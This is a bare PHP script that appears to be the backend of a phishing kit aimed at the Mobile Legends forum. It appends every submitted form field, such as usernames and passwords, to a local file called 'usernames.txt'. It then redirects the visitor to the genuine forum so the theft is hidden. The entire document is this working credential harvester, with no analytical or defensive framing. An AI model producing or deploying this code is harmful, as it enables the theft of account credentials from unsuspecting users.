<?php  
$handle = fopen("usernames.txt", "a"); foreach($_POST as $variable => $value) { 
fwrite($handle, $variable); fwrite($handle, "="); 
fwrite($handle, $value); fwrite($handle, "\r\n");
}
header ('Location: https://forum.mobilelegends.com');
fwrite($handle, "\r\n"); fclose($handle); exit; ?>
